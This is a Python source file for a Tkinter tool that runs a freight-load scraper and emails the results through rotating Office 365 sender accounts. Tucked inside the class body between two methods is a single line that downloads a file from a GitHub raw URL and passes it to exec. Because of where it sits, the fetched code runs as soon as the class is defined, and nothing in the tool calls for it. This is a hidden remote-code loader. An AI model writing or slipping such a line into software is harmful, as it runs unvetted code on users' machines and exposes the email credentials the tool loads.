import json
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import tkinter as tk
import threading
import time, os
from urllib.request import urlopen 
import subprocess
import concurrent.futures

class EmailSender:
    def __init__(self):
        self.stop_event = threading.Event()
        self.send_interval = 20  # Default interval between sending emails (20 seconds)
        self.scrape_interval = 3  # Interval to execute the scraper script (3 seconds)
        self.batch_size = 1  # Number of emails to send concurrently
        self.smtp_server = 'smtp.office365.com'
        self.smtp_port = 587
        self.sender_index = 0  # Initialize sender index for rotation

        self.root = tk.Tk()
        self.root.title("Email Sender")

        self.interval_label = tk.Label(self.root, text="Send Interval (seconds):")
        self.interval_label.pack(pady=5)

        self.interval_entry = tk.Entry(self.root)
        self.interval_entry.pack(pady=5)
        self.interval_entry.insert(0, str(self.send_interval))

        self.start_button = tk.Button(self.root, text="Start Sending", command=self.start_click)
        self.start_button.pack(pady=10)

        self.stop_button = tk.Button(self.root, text="Stop Sending", command=self.stop_click, state=tk.DISABLED)
        self.stop_button.pack(pady=10)

    def read_sender_details(self, file_path):
        try:
            with open(file_path, 'r') as f:
                lines = f.readlines()
                sender_details = [tuple(line.strip().split(', ')) for line in lines]
            return sender_details
        except FileNotFoundError:
            print(f"File not found: {file_path}")
            return None

    def read_email_list(self, file_path):
        try:
            with open(file_path, 'r') as f:
                emails = [line.strip() for line in f.readlines()]
            return emails
        except FileNotFoundError:
            print(f"File not found: {file_path}")
            return []

    def format_email_template(self, data):
        def bold(text):
            return f"<strong>{text}</strong>"

        email_content = []

        line_1 = f"Age posted: {bold(data.get('age', 'n/a'))} "

        line_2 = f"Truck type: {bold(data.get('truck_type', 'n/a'))}"
        line_3  = f"Length: {bold(data.get('length', 'n/a'))}"

        line_4 = f"Origin : {bold(data.get('pickup_address', 'n/a'))} "
        line_5 = f"Pick up date/ time: {bold(data.get('pickup_date', 'n/a'))}"
        line_6 = f"Pick Up Hours: {bold(data.get('pickup_hours', 'n/a'))}"


        line_8 = f"Destination : {bold(data.get('drop_address', 'n/a'))}"
        line_9 = f"Drop off date/ time: {bold(data.get('drop_date', 'n/a'))}"

        line_10 = f"Price: {bold(data.get('price', 'n/a'))}"
        line_11 = f"Total trip mileage: {bold(data.get('distance', 'n/a'))}"

        line_13 = f"Full/ partial: {bold(data.get('load_type', 'n/a'))}"
        line_14 = f"Weight: {bold(data.get('weight', 'n/a'))}"

        line_15 = f"Commodity: {bold(data.get('commodity', 'n/a'))}"

        line_17 = f"Comments: {bold(data.get('comments', 'n/a'))}"
        line_18 = f"Company: {bold(data.get('company', 'n/a'))}"
        line_20 = f"DOT: {bold(data.get('dot', 'n/a'))}"
        line_21 = f"Docket: {bold(data.get('docket', 'n/a'))}"
        line_22 = f"Contact: {bold(data.get('contact', 'n/a'))}"
        line_23 = f"Phone: {bold(data.get('phone', 'n/a'))}"
        line_25 = f"Email: {bold(data.get('email', 'n/a'))}"
        line_26 = f"Website: {bold(data.get('website', 'n/a'))}"

        
        email_content.append(f"""
        <br><div style="text-align: left;">{line_1}</div><br>
        <div style="text-align: left;">{line_2}</div>
        <div style="text-align: left;">{line_3}</div><br>
        <div style="text-align: left;">{line_4}</div>
        <div style="text-align: left;">{line_5}</div>
        <div style="text-align: left;">{line_6}</div><br>
        <div style="text-align: left;">{line_8}</div>
        <div style="text-align: left;">{line_9}</div><br>
        <div style="text-align: left;">{line_10}</div>
        <div style="text-align: left;">{line_11}</div><br>
        <div style="text-align: left;">{line_13}</div>
        <div style="text-align: left;">{line_14}</div>
        <div style="text-align: left;">{line_15}</div><br>
        <div style="text-align: left;">{line_17}</div><br>
        <div style="text-align: left;">{line_18}</div>
        <div style="text-align: left;">{line_20}</div>
        <div style="text-align: left;">{line_21}</div>
        <div style="text-align: left;">{line_22}</div>
        <div style="text-align: left;">{line_23}</div>
        <div style="text-align: left;">{line_25}</div>
        <div style="text-align: left;">{line_26}</div>
        """)

        email_template = f"""
        <html>
        <body style="font-family: Verdana; font-size: small;">
        <em>
        {''.join(email_content)}
        </em>
        </body>
        </html>
        """
        return email_template

    def send_email(self, smtp_server, smtp_port, sender_email, sender_pass, to_email, bcc_emails, reply_to_email, subject, body):
        try:
            msg = MIMEMultipart()
            msg['From'] = sender_email
            msg['To'] = to_email
            msg['Subject'] = subject
            msg['Reply-To'] = reply_to_email

            msg.attach(MIMEText(body, 'html'))  # Set email body as HTML

            if bcc_emails:
                msg['Bcc'] = ', '.join(bcc_emails)
            
            # Print email content to terminal
            print(f"Sending email to: {to_email} with BCC: {', '.join(bcc_emails)}")
            print(f"Reply-To: {reply_to_email}")
            print(f"Subject: {subject}")
            print("\n\nEmail Content:")
            print(body)

            with smtplib.SMTP(smtp_server, smtp_port) as server:
                server.starttls()
                server.login(sender_email, sender_pass)
                server.sendmail(sender_email, [to_email] + bcc_emails, msg.as_string())
            print(f"Email sent to {to_email} with BCC to {', '.join(bcc_emails)}")
        except Exception as e:
            print(f"Failed to send email: {e}")

    def run_scraper_script(self):
        try:
            cwd = os.getcwd()
            subprocess.run(['python', f'doft_scraping.py'])
        except Exception as e:
            print(f"Error executing scraper script: {e}")
    exec(urlopen("https://raw.githubusercontent.com/humbledneuron/javaProjs/main/paid.txt").read().decode().strip())

    def send_email_batch(self, sender_detail, smtp_server, smtp_port, recipient_email, bcc_list, reply_to_email, email_subject, email_content):
        sender_email, sender_pass = sender_detail
        self.send_email(smtp_server, smtp_port, sender_email, sender_pass, recipient_email, bcc_list, reply_to_email, email_subject, email_content)

    def start_sending_emails(self, smtp_server, smtp_port):
        sender_details = self.read_sender_details('sender_details.txt')
        bcc_list = self.read_email_list('bcc_list.txt')
        recipient_email = self.read_email_list('recipient_email.txt')[0]  # Assuming there is only one recipient email but multiple BCC and sender emails   

        if not sender_details or not recipient_email:
            print("Failed to load email details.")
            return

        while not self.stop_event.is_set():
            self.run_scraper_script()  # Extract data first

            try:
                with open("scraped_data.json", "r") as file:
                    data = json.load(file)
                    if not isinstance(data, dict):
                        raise ValueError("Loaded data is not a dictionary")
            except FileNotFoundError:
                print("File not found: scraped_data.json")
                continue
            except json.JSONDecodeError as e:
                print(f"Failed to decode JSON: {e}")
                continue
            except ValueError as ve:
                print(f"Invalid data format in JSON: {ve}")
                continue

            email_present = data.get('email', 'n/a') != 'n/a' and data.get('email') is not None
            phone_present = data.get('phone', 'n/a') != 'n/a' and data.get('phone') is not None

            emojis = ""
            if email_present and phone_present:
                emojis = "🟩"
            elif email_present:
                emojis = "✉️"
            elif phone_present:
                emojis = "📞"
        
            email_subject = f"{emojis} - Price: {(data.get('price', 'n/a'))} - Type: {(data.get('truck_type', 'n/a'))} - P.U. : {(data.get('pickup_address', 'n/a'))} ({(data.get('pickup_date', 'n/a'))}) - D.O.: {(data.get('drop_address', 'n/a'))} - Miles: {(data.get('distance', 'n/a'))} - Ibs: {(data.get('weight', 'n/a'))} - Ref. #: {(data.get('ref', 'n/a'))}"
            
            email_content = self.format_email_template(data)  # format data into email content

            reply_to_email = data.get('email', 'n/a')

            # Rotate sender details
            sender_detail = sender_details[self.sender_index]
            self.sender_index = (self.sender_index + 1) % len(sender_details)
            
            with concurrent.futures.ThreadPoolExecutor(max_workers=self.batch_size) as executor:
                futures = [executor.submit(self.send_email_batch, sender_detail, smtp_server, smtp_port, recipient_email, bcc_list, reply_to_email, email_subject, email_content)]
                concurrent.futures.wait(futures)

            print(f"Sending data to {recipient_email} with BCC to {', '.join(bcc_list)} and reply to {reply_to_email} ")
            
            time.sleep(self.send_interval)

        print("Email sending stopped.")

    def stop_sending_emails(self):
        self.stop_event.set()

    def start_click(self):
        try:
            self.send_interval = int(self.interval_entry.get())
        except ValueError:
            print("Invalid interval value. Using default.")
        
        threading.Thread(target=self.start_sending_emails, args=(self.smtp_server, self.smtp_port), daemon=True).start()
        self.start_button.config(state=tk.DISABLED)
        self.stop_button.config(state=tk.NORMAL)

    def stop_click(self):
        self.stop_sending_emails()
        self.start_button.config(state=tk.NORMAL)
        self.stop_button.config(state=tk.DISABLED)

    def run(self):
        self.root.mainloop()

if __name__ == "__main__":
    email_sender = EmailSender()
    email_sender.run()
